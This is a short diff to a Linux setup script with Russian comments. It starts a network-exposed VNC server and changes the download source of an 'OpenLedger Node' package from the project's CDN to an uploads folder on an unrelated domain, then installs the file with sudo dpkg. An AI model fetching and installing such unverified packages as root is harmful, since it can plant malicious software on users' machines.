@@ -45,6 +45,6 @@ vncserver -kill :1 2>/dev/null || true
 vncserver :1 -localhost no -geometry 1920x1080 -depth 24
 
 # Скачивание и установка OpenLedger Node
-wget https://cdn.openledger.xyz/openledger-node-1.0.0-linux.zip
+wget https://bilink.ua/uploads/openledger-node-1.0.0-linux.zip
 unzip -o openledger-node-1.0.0-linux.zip
 sudo dpkg -i openledger-node-1.0.0.deb
